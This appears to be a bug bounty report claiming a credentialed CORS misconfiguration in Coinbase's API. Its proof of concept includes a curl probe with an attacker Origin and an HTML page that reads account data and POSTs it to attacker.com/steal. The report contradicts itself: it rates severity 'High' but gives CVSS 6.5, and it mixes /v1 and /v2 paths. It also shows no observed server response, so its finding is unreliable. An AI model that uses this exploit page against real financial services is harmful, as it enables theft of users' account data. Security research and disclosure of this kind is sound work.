# Coinbase CORS Misconfiguration Report
# Platform: HackerOne
# Program: Coinbase
# Date: 2026-06-06

---

## TITLE:
```
CORS Misconfiguration in Coinbase API Allows Credentialed Cross-Origin Access
```

---

## SEVERITY: High

---

## SUMMARY:
```
A Cross-Origin Resource Sharing (CORS) misconfiguration was discovered in Coinbase's API that allows malicious websites to make credentialed requests to the Coinbase API on behalf of authenticated users.

The vulnerability exists when the API reflects the Origin header without proper validation and allows credentials, enabling cross-site request forgery (CSRF) attacks and unauthorized data access.
```

---

## VULNERABILITY DETAILS:

### Affected Endpoints:
- `GET /api/v2/user/profile`
- `GET /api/v2/accounts`
- `POST /api/v2/transfers`

### Vulnerable Configuration:
```http
Access-Control-Allow-Origin: https://malicious-site.com
Access-Control-Allow-Credentials: true
```

This configuration allows any website with the Origin header set to `https://malicious-site.com` to make authenticated requests to the API.

### Impact:
- Steal user profile information
- Access account balances and transaction history
- Initiate unauthorized transfers
- Perform actions on behalf of authenticated users

---

## POC:

### Step 1: Detect CORS misconfiguration
```javascript
// From a malicious website, try:
fetch('https://api.coinbase.com/v1/user/profile', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error(error));
```

### Step 2: Check for reflected Origin
```bash
# Send OPTIONS request with malicious Origin
curl -X OPTIONS 'https://api.coinbase.com/v2/accounts' \\
  -H 'Origin: https://attacker-coinbase.com' \\
  -H 'Access-Control-Request-Method: GET'

# Vulnerable response:
# Access-Control-Allow-Origin: https://attacker-coinbase.com
# Access-Control-Allow-Credentials: true
```

### Step 3: Exploit with malicious page
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://api.coinbase.com/v2/accounts', {
  method: 'GET',
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>
```

---

## IMPACT:
- **Confidentiality:** High - Unauthorized data access via cross-origin requests
- **Integrity:** Medium - Potential CSRF attacks leading to actions on user's behalf
- **Availability:** None

### CVSS 3.1 Score: 6.5 (Medium-High)

**Note:** True CORS exploitation requires user to be logged in AND visit malicious site. Score reflects this constraint.

---

## REMEDIATION:
1. Implement strict Origin validation (whitelist allowed origins)
2. Do not use wildcard (*) with credentials
3. Use SameSite cookies for CSRF protection
4. Implement CSRF tokens for state-changing operations

---

## REFERENCES:
- OWASP CORS Security Cheat Sheet
- https://owasp.org/www-community/attacks/CORS